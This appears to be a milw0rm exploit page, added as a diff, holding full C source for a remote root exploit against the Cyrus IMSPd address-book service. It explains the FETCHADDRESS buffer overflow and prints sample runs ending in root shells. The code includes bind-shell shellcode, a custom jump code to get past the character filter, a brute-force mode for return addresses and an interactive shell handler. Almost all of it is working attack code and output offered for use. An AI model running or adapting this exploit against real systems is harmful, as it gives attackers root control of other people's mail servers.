@@ -1,0 +1,565 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+/*
+** Cyrus IMSPD Remote Root Exploit
+** -------------------------------
+**
+** Bug found by: Felix Lindner &lt;felix.lindner@nruns.com&gt;
+** Exploit coded by: SpikE &lt;spike_vrm@mail.com&gt;
+**
+** Exploitation techinique:
+**
+** As said by Felix Lindner, the bug lies in the &quot;abook_dbname&quot; function. To cause
+** the overrun, we must call this function with a long &quot;name&quot; variable. It can be
+** acomplished by supplying the FETCHADDRESS command. This command takes 2 parameters.
+** The first one is exactly the &quot;name&quot; var. So, to cause the overflow, we must just
+** send the FETCHADDRESS command with an overlong argument.
+** To cause the overflow is easy, but using it to execute arbitrary commands is not
+** so easy. It is because IMSPd filters all characters that is grather than 0x80.
+** Well, put the shellcode is not the problem, cause IMSPd does not filter the args
+** after the second one, so, the Shellcode goes in the third arg. The problem is that
+** the address of the buffer where the shellcode is placed contains chars grather than
+** 0x80 and we can not supply this addr. Well, how it can be done??? After some time
+** of research, I found that the address of the buffer where the &quot;name&quot; var is placed
+** does not contains these characters (at least on my box). So, I manange my buffer
+** to overwrite the EIP with this address. But there is another problem: I can not write
+** my shellcode here. Again, after some time, I got the solution. Looking at the stack
+** after the overflow, I found the address of the buffer where the shellcode was placed.
+** So, I coded a Jumpcode to get this addr from the stack, add some offset to the shellcode
+** and jump there. There was a dificult task once the RET opcode is 0xc3 and I can not
+** place the code in the buffer. To circumvent it. I overflowned the EIP and the next
+** four bytes with the same value. This way, when I get the control, I know where I am.
+** With this ability, I can take this value, add some offset and make and ADD at this
+** location to turn an 0x45 in an 0xc3, RET.
+** Well, this is how I have acomplished this task. As you can see, there two possibilities
+** of success. You can be lucky and found a system that the address os shellcode does not
+** have invalid chars or the name addr too. Anyone of this will do the task.
+**
+** Well, that is all. Sorry for my poor english (I am brazilian), I am tired to correct it.
+** I hope one can improve this code to be more reliable, but for now, it is not so BAD.
+**
+** Screenshot:
+**
+** Hardcoded:
+**
+** SpikE@VermE imsp]$ ./a.out -t 0 -h localhost
+**
+** ==[ Cyrus IMSPd Remote Root Exploit bY SpikE ]==
+**
+** *** Target plataform : IMSPd 1.7 - Red Hat Linux release 8.0 (Psyche)
+** *** Target host : localhost
+** *** Target port : 406
+** *** Bind to port : 31337
+** *** Target RET : 0x08065368
+**
+** [+] Connected
+** [+] Creating evil buffer
+** [+] Sending evil buffer
+** [+] Verifying ...
+** [+] Yeap.. It is a root shell
+**
+** Linux VermE.com.br 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
+** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+** cat /etc/issue
+** Red Hat Linux release 8.0 (Psyche)
+** Kernel \r on an \m
+**
+** exit
+** [SpikE@VermE imsp]$
+**
+** Bruteforce:
+**
+** [SpikE@VermE imsp]$ ./a.out -h localhost -b
+**
+** ==[ Cyrus IMSPd Remote Root Exploit bY SpikE ]==
+**
+** *** Target host : localhost
+** *** Target port : 406
+** *** Bind to port : 31337
+** *** Bruteforce mode start : 0x08065357
+**
+** [+] Using RetAddr = 0x08065357
+** [+] Connected
+** [+] Creating evil buffer
+** [+] Sending evil buffer
+** [+] Verifying ...
+**
+** [+] Using RetAddr = 0x0806535b
+** [+] Connected
+** [+] Creating evil buffer
+** [+] Sending evil buffer
+** [+] Verifying ...
+**
+** [+] Using RetAddr = 0x0806535f
+** [+] Connected
+** [+] Creating evil buffer
+** [+] Sending evil buffer
+** [+] Verifying ...
+**
+** [+] Using RetAddr = 0x08065363
+** [+] Connected
+** [+] Creating evil buffer
+** [+] Sending evil buffer
+** [+] Verifying ...
+**
+** [+] Using RetAddr = 0x08065367
+** [+] Connected
+** [+] Creating evil buffer
+** [+] Sending evil buffer
+** [+] Verifying ...
+**
+** [+] Using RetAddr = 0x0806536b
+** [+] Connected
+** ** [+] Creating evil buffer
+** [+] Sending evil buffer
+** [+] Verifying ...
+** [+] Yeap.. It is a root shell
+**
+** Linux VermE.com.br 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
+** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+** cat /etc/issue
+** Red Hat Linux release 8.0 (Psyche)
+** Kernel \r on an \m
+**
+** exit
+** [SpikE@VermE imsp]$
+**
+**
+*/
+
+#include &lt;getopt.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;stdio.h&gt;
+
+/*--&lt; Prototypes &gt;--*/
+void Usage(char *);
+void fatal(char *);
+int ConectToHost(char *,int);
+char *CreateEvilBuffer(int,int);
+int VerifyXpl(char *, int);
+void doHack(int);
+int GetNextAddr(int);
+
+/*--&lt; Defines &gt;--*/
+#define DEFAULT_PORT 406
+#define DEFAULT_START_ADDRESS 0x8061001
+#define BRUTEFORCE 1
+#define TARGET 2
+#define STDIN 0
+#define STDOUT 1
+#define ROOT_PORT 31337
+#define PORT_OFFSET 29
+
+/*--&lt; From IMSP Source &gt;--*/
+char im_table[256] = {
+    0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 2, 2, 0, 2, 2,
+    2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
+    2, 7, 0, 7, 7, 6, 7, 7, 2, 2, 6, 7, 7, 7, 7, 7,
+    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
+    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
+    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 0, 7, 7, 7,
+    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
+    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 2, 7, 7, 7, 2,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+};
+#define isqstr(c) (im_table[(unsigned char)(c)]&amp;2)
+/*--&lt; END &gt;--*/
+
+struct
+{
+  char *Name;
+  int Retaddr;
+}Targets[] =
+  {
+    &quot;IMSPd 1.7 - Red Hat Linux release 8.0 (Psyche)&quot;,
+    0x8065368,
+
+    &quot;IMSPd 1.6a3 - Red Hat Linux release 8.0 (Psyche)&quot;,
+    0x8061d78,
+
+    // Finish
+    0,
+    0
+  };
+
+// Shellcode by Marco Ivaldi &lt;raptor 0xdeadbeef info&gt;
+char Shellcode[] =
+  &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot;
+  &quot;\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80&quot;
+  &quot;\x89\xc7\x52\x66\x68&quot;
+  &quot;BP&quot; // Port to bind
+  &quot;\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80&quot;
+  &quot;\xb0\x66\xb3\x04\xcd\x80&quot;
+  &quot;\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80&quot;
+  &quot;\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80&quot;
+  &quot;\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
+
+// Jumpcode bY SpikE
+char JmpToShellcode[] =
+  &quot;\x41&quot; // nop like
+  &quot;\x41&quot; // nop like
+  &quot;\x41&quot; // nop like
+  &quot;\x41&quot; // nop like
+  &quot;\x41&quot; // nop like
+  &quot;\x41&quot; // nop like
+  &quot;\x41&quot; // nop like
+
+  &quot;\x58&quot; // pop %eax
+  &quot;\x6a\x7e&quot; // push $0x7e
+  &quot;\x5b&quot; // pop %ebx
+  &quot;\x01\x58\x23&quot; // add %ebx,0x22(%eax)
+  &quot;\x58&quot;
+  &quot;\x58&quot; // pop %eax
+  &quot;\x58&quot; // pop %eax
+  &quot;\x58&quot; // pop %eax
+  &quot;\x58&quot; // pop %eax
+  &quot;\x58&quot; // pop %eax
+  &quot;\x58&quot; // pop %eax
+  &quot;\x58&quot; // pop %eax
+  &quot;\x58&quot; // pop %eax
+  &quot;\x6a\x7e&quot; // push $0x7e
+  &quot;\x58&quot; // pop %eax
+  &quot;\x01\x44\x24\x04&quot; // add %eax,0x4(%esp,1)
+  &quot;\x01\x44\x24\x04&quot; // add %eax,0x4(%esp,1)
+  &quot;\x58&quot; // pop %eax
+
+  &quot;\x45&quot; // ret
+  &quot;\x45&quot; // ret
+  &quot;\x45&quot; // ret
+  &quot;\x45&quot; // ret
+  &quot;\x45&quot; // ret
+  &quot;\x45&quot; // ret
+  &quot;\x45&quot; // ret
+  &quot;\x45&quot;; // ret
+
+struct STACK
+{
+  char name[132];
+  int eip;
+  int ID;
+  int Name;
+  int Acl;
+};
+
+int main(int argc, char **argv)
+{
+  extern char *optarg;
+  extern int optind;
+    char opt;
+    char *Host = NULL;
+    int Port = DEFAULT_PORT;
+    int Flags = 0;
+    int StartAddress = DEFAULT_START_ADDRESS;
+    int TargetNumber = 0;
+    int Sock,rootSock,i;
+    char *EvilBuffer;
+    int BindPort = ROOT_PORT;
+
+  fprintf(stdout,&quot;\n==[ Cyrus IMSPd 1.7 Remote Root Exploit bY SpikE ]==\n\n&quot;);
+
+  // Process arguments
+  while ( (opt = getopt(argc,argv,&quot;h:t:p:ba:r:&quot;)) != EOF)
+  {
+    switch(opt)
+    {
+      case 'r':
+        BindPort = atoi(optarg);
+        if(!BindPort) Usage(argv[0]);
+      break;
+      case 'h':
+        Host = optarg;
+      break;
+      case 'p':
+        Port = atoi(optarg);
+        if(!Port) Usage(argv[0]);
+      break;
+      case 'b':
+        if(Flags == 0)
+          Flags = BRUTEFORCE;
+        else
+          Usage(argv[0]);
+      break;
+      case 'a':
+        if( sscanf(optarg,&quot;0x%lx&quot;,&amp;StartAddress) != 1)
+          Usage(argv[0]);
+      break;
+      case 't':
+        TargetNumber = atoi(optarg);
+        if(Flags == 0)
+          Flags = TARGET;
+        else
+          Usage(argv[0]);
+      break;
+      default: Usage(argv[0]);
+      break;
+    }
+  }
+  if(Host == NULL || Flags == 0) Usage(argv[0]);
+
+  // Verify target
+  for(i=0;;i++)
+    if(Targets[i].Name == 0) break;
+  if(--i&lt;TargetNumber) Usage(argv[0]);
+
+  if(Flags == TARGET)
+    fprintf(stdout,&quot;*** Target plataform : %s\n&quot;,Targets[TargetNumber].Name);
+  fprintf(stdout,&quot;*** Target host : %s\n&quot;,Host);
+  fprintf(stdout,&quot;*** Target port : %u\n&quot;,Port);
+  fprintf(stdout,&quot;*** Bind to port : %u\n&quot;,BindPort);
+
+  if(Flags == TARGET)
+    fprintf(stdout,&quot;*** Target RET : %#010x\n\n&quot;,Targets[TargetNumber].Retaddr);
+  else
+    fprintf(stdout,&quot;*** Bruteforce mode start : %#010x\n\n&quot;,StartAddress);
+
+  switch(Flags)
+  {
+    case TARGET:
+      Sock = ConectToHost(Host,Port);
+      if(Sock == -1) fatal(&quot;Could not connect&quot;);
+      else fprintf(stdout,&quot;[+] Connected\n&quot;);
+
+      fprintf(stdout,&quot;[+] Creating evil buffer\n&quot;);
+      EvilBuffer = CreateEvilBuffer(Targets[TargetNumber].Retaddr,BindPort);
+
+      fprintf(stdout,&quot;[+] Sending evil buffer\n&quot;);
+
+      scanf(&quot;%d&quot;,&amp;i);
+      
+      send(Sock,EvilBuffer,strlen(EvilBuffer),0);
+      sleep(1);
+
+      fprintf(stdout,&quot;[+] Verifying ...\n&quot;);
+      sleep(1);
+      if( (rootSock = VerifyXpl(Host,BindPort)) &gt;=0)
+      {
+        close(Sock);
+        free(EvilBuffer);
+        fprintf(stdout,&quot;[+] Yeap.. It is a root shell\n\n&quot;);
+        doHack(rootSock);
+        close(rootSock);
+        exit(0);
+      }
+      else
+        fatal(&quot;No root shell. Maybe next time&quot;);
+    break;
+    default:
+      for(;;)
+      {
+        fprintf(stdout,&quot;[+] Using RetAddr = %#010x\n&quot;,StartAddress);
+
+        Sock = ConectToHost(Host,Port);
+        if(Sock == -1) 
+        {
+          // To avoid stop the bruteforce
+          fprintf(stdout,&quot;[+] Could not connect. Waiting...\n\n&quot;);
+          sleep(120);
+        }
+        else
+        {
+          fprintf(stdout,&quot;[+] Connected\n&quot;);
+
+          fprintf(stdout,&quot;[+] Creating evil buffer\n&quot;);
+          EvilBuffer = CreateEvilBuffer(StartAddress,BindPort);
+
+          fprintf(stdout,&quot;[+] Sending evil buffer\n&quot;);
+          send(Sock,EvilBuffer,strlen(EvilBuffer),0);
+          sleep(1);
+
+          fprintf(stdout,&quot;[+] Verifying ...\n&quot;);
+          sleep(1);
+          if( (rootSock = VerifyXpl(Host,BindPort)) &gt;=0)
+          {   // actualite informatique
+            close(Sock);
+            free(EvilBuffer);
+            fprintf(stdout,&quot;[+] Yeap.. It is a root shell\n\n&quot;);
+            doHack(rootSock);
+            close(rootSock);
+            exit(0);
+          }
+          close(Sock);
+          free(EvilBuffer);
+          fprintf(stdout,&quot;\n&quot;);
+
+          StartAddress = GetNextAddr(StartAddress);
+        }
+      }
+    break;
+  }
+
+  free(EvilBuffer);
+  close(Sock);
+}
+
+void Usage(char *Prog)
+{
+  int i;
+  fprintf(stderr, &quot;Usage: %s -h hostname &lt;options&gt;\n\n&quot;
+      &quot;Options:\n\n&quot;
+      &quot; -t target : Select the target\n&quot;
+      &quot; -p portnumber : Sets a new port number\n&quot;
+      &quot; -b : Bruteforce mode\n&quot;
+      &quot; -a address : Defines the start address to bruteforce (Format: 0xdeadbeef)\n&quot;
+      &quot; -r port : Defines the port to bind (Default = 31337)\n\n&quot;
+      &quot;Targets:\n\n&quot;,Prog);
+
+  for(i=0;;i++)
+  {
+    if(Targets[i].Name != 0)
+      fprintf(stderr,&quot; [%u] %s\n&quot;,i,Targets[i].Name);
+    else
+      break;
+  }
+  fprintf(stderr,&quot;\n&quot;);
+  exit(1);
+}
+
+void fatal(char *ErrorMsg)
+{
+  fprintf(stderr,&quot;[-] %s\n\n&quot;,ErrorMsg);
+  exit(1);
+}
+
+int ConectToHost(char *Host,int Port)
+{
+  struct sockaddr_in server;
+  struct hostent *hp;
+  int s;
+
+  server.sin_family = AF_INET;
+  hp = gethostbyname(Host);
+  if(!hp) return(-1);
+
+  memcpy(&amp;server.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
+  server.sin_port = htons(Port);
+
+  s = socket(PF_INET,SOCK_STREAM,0);
+  if(connect(s,(struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)
+    return(-1);
+
+  return(s);
+}
+
+char *CreateEvilBuffer(int Retaddr,int BindPort)
+{
+  struct STACK Buffer;
+  char *Ptr = (char *)&amp;Buffer;
+  char NOPs[2000];
+  static char Buf[sizeof(Buffer)+sizeof(NOPs)+sizeof(Shellcode)+100];
+  uint16_t *PortPtr = (uint16_t *)(Shellcode+PORT_OFFSET);
+  int i;
+
+  memset(&amp;Buffer,0x41,sizeof(Buffer));
+  memset(NOPs,0x90,sizeof(NOPs));
+
+  *PortPtr = htons(BindPort);
+
+  memcpy(Ptr,JmpToShellcode,sizeof(JmpToShellcode)-1);
+  Buffer.eip = Retaddr;
+  Buffer.ID = Retaddr;
+  Buffer.Name = 0x00;
+
+  NOPs[sizeof(NOPs)-1] = 0;
+  
+  sprintf(Buf,&quot;SPK FETCHADDRESS \&quot;%s\&quot; \&quot;SPK\&quot; %s%s\r\n&quot;,(char *)&amp;Buffer,NOPs,Shellcode);
+  return(Buf);
+}
+
+void doHack(int Sock)
+{
+  char buffer[1024 * 10];
+  int count;
+  fd_set readfs;
+
+  write(Sock,&quot;uname -a;id\n&quot;,12);
+  while(1)
+  {
+    FD_ZERO(&amp;readfs);
+    FD_SET(STDIN, &amp;readfs);
+    FD_SET(Sock, &amp;readfs);
+    if(select(Sock + 1, &amp;readfs, NULL, NULL, NULL) &gt; 0)
+    {
+      if(FD_ISSET(STDIN, &amp;readfs))
+      {
+        if((count = read(STDIN, buffer, 1024)) &lt;= 0)
+        {
+          if(errno == EWOULDBLOCK || errno == EAGAIN)
+            continue;
+          else
+          {
+            close(Sock);
+            exit(-1);
+          }
+        }
+        write(Sock, buffer, count);
+      }
+      if(FD_ISSET(Sock, &amp;readfs))
+      {
+        if((count = read(Sock, buffer, 1024)) &lt;= 0)
+        {
+          if(errno == EWOULDBLOCK || errno == EAGAIN)
+            continue;
+          else
+          {
+            close(Sock);
+            exit(-1);
+          }
+        }
+        write(STDOUT, buffer, count);
+      }
+    }
+  }
+}
+int VerifyXpl(char *Host, int Port)
+{
+  struct sockaddr_in server;
+  struct hostent *hp;
+  int s;
+
+  // Create client struct
+  server.sin_family = AF_INET;
+  hp = gethostbyname(Host);
+  if(!hp)
+    return(-1);
+  memcpy(&amp;server.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
+  server.sin_port = htons(Port);
+  s = socket(PF_INET,SOCK_STREAM,0);
+
+  if(connect(s,(struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)
+    return(-1);
+  return(s);
+}
+
+int GetNextAddr(int Addr)
+{
+  Addr+=4;
+  for(;;)
+  {
+    if( !isqstr( (Addr &amp; 0x000000FF) ) ) Addr+=4;
+    else if( !isqstr( (Addr &amp; 0x0000FF00) &gt;&gt; 8 ) ) Addr+=4;
+    else if( !isqstr( (Addr &amp; 0x00FF0000) &gt;&gt; 16 ) ) Addr+=4;
+    else if( !isqstr( (Addr &amp; 0xFF000000) &gt;&gt; 24 ) ) Addr+=4;
+    else break;
+  }
+  
+  return(Addr);
+}</pre>
+//downloaded from milw0rm.com
+</html>
